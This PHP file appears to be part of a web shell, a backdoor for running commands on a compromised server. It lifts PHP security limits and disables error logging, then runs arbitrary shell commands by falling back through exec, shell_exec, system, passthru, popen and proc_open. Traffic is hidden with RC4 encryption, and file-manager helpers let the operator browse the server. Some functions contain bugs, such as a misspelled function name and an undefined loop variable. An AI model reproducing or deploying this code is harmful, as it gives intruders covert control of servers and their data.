<?php
$loadTime = microtime(true);
$isWIN = DIRECTORY_SEPARATOR === '\\';
define('DS', DIRECTORY_SEPARATOR);

# Restoring
@ini_restore('safe_mode_include_dir');
@ini_restore('safe_mode_exec_dir');
@ini_restore('disable_functions');
@ini_restore('allow_url_fopen');
@ini_restore('safe_mode');
@ini_restore('open_basedir');
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('file_uploads', 1);
@ini_set('allow_url_fopen', 1);
@ini_alter('error_log', null);
@ini_alter('log_errors', 0);
@ini_alter('file_uploads', 1);
@ini_alter('allow_url_fopen', 1);

@error_reporting(7);
@ini_set('memory_limit', '128M'); //change it if phpzip fails
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
if (function_exists('set_magic_quotes_runtime')){
    @set_magic_quotes_runtime(0);
}


function mHide($n, $v){
    return "<input id='$n' name='$n' type='hidden' value='$v' />";
}

function mLink($t, $o, $e = '', $m = true){
    if ($m) $o .= ';return false;';
    return "<a href='#' onclick='$o' $e>$t</a>";
}

function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
    if ($tt !== '') $tt = "$tt<br>";

    $input = "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
    if ($nl !== '') $input = "<p>$input</p>";
        
    return $input;
}

function mSubmit($v, $o, $nl = '', $e = ''){
    $input = "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
    if ($nl !== '') $input = "<p>$input</p>";
    
    return $input;
}

function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
    $tmp = '';
    if ($o) $o = "onchange='$o'";
    if ($t) $t = "$t<br>";
    foreach ($v as $key => $value){
        if ($nk) $key = $value;
        $tmp .= "<option value='$key'" . ($s == $key ? " selected='selected'" : "") . ">$value</option>";
    }

    $tmp = "$t<select class='theme' id='$n' name='$n' $o $e>$tmp</select>";
    if ($nl) 
        $tmp = "<p>$tmp</p>";
    
    return $tmp;
}

function mCheck($n, $v, $o = '', $c = false){
    return "<input id='$n' name='$n' value='$v' type='checkbox' onclick='$o' " . ($c ? 'checked' : '') . "/>";
}

function genPaginator($c, $t = -1, $fm = true) {
    global $p;
    
    $l = 'dbexec(euc("' . (isset($p['code']) ? $p['code'] : '') . '") + "&pg=';
    if ($fm)
        $l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
    
    if ($t < 0)
        $t = $c + 1;
    
    $tmp = '<div class="paginator">';
    $i = 0;
    while($i < $t) {
        $i++;
        if ($i < $c)
            $tmp .= mLink($i, $l . $i . '")', 'class="prev"');
        else if ($i == $c)
            $tmp .= '<span class="current">' . $i . '</span>';
        else
            $tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
    }

    return $tmp . '</div>';
}


function fix_magic_quote($arr){
    $quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
    $quotes_sybase = (empty($quotes_sybase) || $quotes_sybase === 'off') ? false : true;
    if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
        if(is_array($arr)){
            foreach($arr as $k => $v){
                if(is_array($v)) $arr[$k] = fix_magic_quote($v);
                else $arr[$k] = ($quotes_sybase ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v)));
            }
        } else {
            $arr = stripslashes($arr);          
        }
    }
    return $arr;
}

function rc4Init($pwd) {
    $key = array();
    $box = array();
    $pwd_length = strlen($pwd);
    
    for ($i = 0; $i < 256; $i++) {
        $key[$i] = ord($pwd[$i % $pwd_length]);
        $box[$i] = $i;
    }
    
    for ($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $key[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
    
    return $box;
}

function rc4($data, $box) {
    $cipher = '';
    $data_length = strlen($data);
    
    for ($a = $j = $i = 0; $i < $data_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $cipher .= chr(ord($data[$i]) ^ $box[(($box[$a] + $box[$j]) % 256)]);
    }
    
    return $cipher;
}

function rc4encrypt($data, $box) {
    global $config;
    for ($i = 1; $i <= $config['rc4drop']; $i++)
        $data = chr(mt_rand(33, 122)) . $data;
    return rc4($data, rc4Init($box));
}

function rc4decrypt($data, $box) {
    global $config;
    return substr(rc4($data, rc4Init($box)), $config['rc4drop']);
}

function getData(){
    global $config;
    $p = '';
    if (isset($_POST[$config['consNames']['post']])) $p = fix_magic_quote($_POST[$config['consNames']['post']]);
    else if (isset($_GET[$config['consNames']['post']])) $p = fix_magic_quote($_GET[$config['consNames']['post']]);
    if (!empty($p)){
        $data = array();
        $p = rc4decrypt(base64_decode($p), $config['sPass']);
        foreach(explode('&', $p) as $tmp) {
            $tmp = explode('=', $tmp);
            if (!empty($tmp[0])){
                if (strpos($tmp[0], '[]') !== false) $data[str_replace('[]', '', $tmp[0])][] = rawurldecode($tmp[1]);
                else $data[$tmp[0]] = rawurldecode($tmp[1]);
            }
        }
        $p = $data;
    }
    return $p;
}

function getSelf(){
    return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
}

function tText($id, $def = false){
    // TODO ver que hacer con esta func

    if ($def === false) {
        return $id;
    }

    if (isset($lang[$id])) return $lang[$id];
    else return $def;
}

function showIcon($f){
    $image = 'unk';
    $f = strtolower(substr(strrchr($f, '.'), 1));
    $img = array('htaccess', 'asp', 'cgi', 'php', 'html', 'jpg', 'js', 'swf', 'txt',
     'tar', 'mp3', 'avi', 'cmd', 'cpp', 'ini', 'doc', 'exe', 'log', 'pl', 'py', 'xml');

    $imgEquals = array(
      'tar' => array('tar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'zip', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'rar', 'uuf', '7z'), 
      'php' => array('php', 'php3', 'php4', 'php5', 'phtml', 'shtml'), 
      'jpg' => array('jpg', 'gif', 'png', 'jpeg', 'jfif', 'jpe', 'bmp', 'ico', 'tif', 'tiff'), 
      'html'=> array('html', 'htm'), 
      'avi' => array('avi', 'mov', 'mvi', 'mpg', 'mpeg', 'wmv', 'rm', 'mp4'), 
      'lnk' => array('lnk', 'url'), 
      'ini' => array('ini', 'css', 'inf'), 
      'doc' => array('doc', 'dot', 'wri', 'rtf', 'pdf'), 
      'js'  => array('js', 'vbs'), 
      'cmd' => array('cmd', 'bat', 'pif'), 
      'swf' => array('swf', 'fla'), 
      'mp3' => array('mp3', 'au', 'midi', 'mid'), 
      'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
    );

    if (in_array($f, $img)) $image = $f;
    if ($image === 'unk'){
        foreach ($imgEquals as $k => $v){
            if (in_array($f, $v)){
                $image = $k;
                break;
            }
        }
    }

    return "<div class='image $image'></div>";
}

# General functions
function hsc($s){
    //return htmlspecialchars($s, 2|1);
    return htmlentities($s);
}

function fixRoute($r){
    return str_replace(array('/', '\\'), DS, $r);
}

function execute($e){
    if (empty($e)){
        return '';
    }

    //$e = $e . ' 2>&1';
    $dis_func = explode(',', get_cfg_var('disable_functions'));

    if (function_exists('exec') && !in_array('exec', $dis_func)){
        @exec($e, $r);
        if ($r) {
            $r = implode("\n", $r);
        }
    } else if (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
        $r = @shell_exec($e);
    } else if (function_exists('system') && !in_array('system', $dis_func)){
        @ob_start();
        @system($e);
        $r = @ob_get_contents();
        @ob_end_clean();
    } else if (function_exists('passthru') && !in_array('passthru', $dis_func)){
        @ob_start();
        @passthru($e);
        $r = @ob_get_contents();
        @ob_end_clean();
    } else if (function_exists('popen') && !in_array('popen', $dis_func)){
        $h = popen($e, 'r');
        if (is_rource($h)){ 
            if (function_exists('fread') && function_exists('feof')){
                while (!feof($h))
                    $r .= fread($h, 512);
            } else if (function_exists('fgets') && function_exists('feof')){
                while (!feof($h))
                    $r .= fgets($h, 512);
            }
        }
        pclose($h);
    } else if (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
        $ds = array(1 => array('pipe', 'w'));
        //$ds = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $h = @proc_open($e, $ds, $pipes);
        //$h = @proc_open($e, $ds, $pipes, getcwd(), array());
        if (is_rource($h)){
            if (function_exists('fread') && function_exists('feof')){
                while (!feof($pipes[1]))
                    $r .= fread($pipes[1], 512);
            } else if (function_exists('fgets') && function_exists('feof')){
                while (!feof($pipes[1]))
                    $r .= fgets($pipes[1], 512);
                /*while (!feof($pipes[2]))
                    $r .= fgets($pipes[2], 512);*/
            }
        }
        @proc_close($h);
    }

    return($r);
}

function safeStatus(){
    $safe_mode = @ini_get('safe_mode');
    if (!$safe_mode && strpos(execute('echo abcdef'), 'def') != 3) $safe_mode = true;
    return $safe_mode;
}

function getcfg($n){
    $result = get_cfg_var($n);
    if ($result == 0) return tText('no', 'no');
    else if ($result == 1) return tText('yes', 'yes');
    else return $result;
}

function sizecount($s){
    if ($s[0] === '*') return $s;
    $sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
    return @round( $s / pow(1024, ($i = floor(log($s, 1024)))), 2) . $sizename[$i];
}

function getPath($s, $n){
    if ($n === '.') $n = $s;
    if (substr($n, -1) !== DS) $n = $n . DS;
    return $n;
}

function getUpPath($n){
    $pathdb = explode(DS, $n);
    $num = count($pathdb);
    if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
    $uppath = implode(DS, $pathdb) . DS;
    return $uppath;
}

function get_all_files($path){
    $files = glob(realpath($path).DS.'*');
    foreach ($variable as $value) {
        if (is_dir($value)){
            $subdir = glob($value.DS.'*');
            if (is_array($files) && is_array($subdir)) $files = array_merge($files, $subdir);
        }
    }
    return $files;
}

function sAjax($i){
    global $config;
    exit(base64_encode(rc4encrypt($i, $config['sPass'])));
}

function sDialog($i){
    return "<br><div id='uires' class='uires'>$i</div><br>";
}

function sValid($v){
    return ((isset($v)) && ($v !== ''));
}

function filesize64($file){
    $size = filesize($file);
    if ($size > 1610612736 or $size < -1){
        /*
        global $isWIN;
        $size = 0;
        if (!safeStatus()){
            $cmd = ($isWIN) ? "for %F in (\"$file\") do @echo %~zF" : "stat -c%s \"$file\"";
            execute($cmd, $output);
            ctype_digit($size = trim($output));
        }
    
        if ($isWIN && class_exists("COM")){
            try {
                $fsobj = new COM('Scripting.FileSystemObject');
                $f = $fsobj->GetFile(realpath($file));
                $size = $f->Size;
            } catch (Exception $e){}
        }
        
        $piece = 1073741824;
        $fp = @fopen($file, 'r');
        @fseek($fp, 0, SEEK_SET);
        while ($piece > 1){
            @fseek($fp, $piece, SEEK_CUR);
            if (@fgetc($fp) === false){
                @fseek($fp, -$piece, SEEK_CUR);
                $piece = (int)($piece / 2);
            } else {
                @fseek($fp, -1, SEEK_CUR);
                $size += $piece;
            }
        }

        while (@fgetc($fp) !== false)
            $size++;
            
        @fclose($file_pointer);
        */
        $size = sprintf("%u", $size);
        $sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
        $size = '* ' . @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
    }
    
    return $size;
}
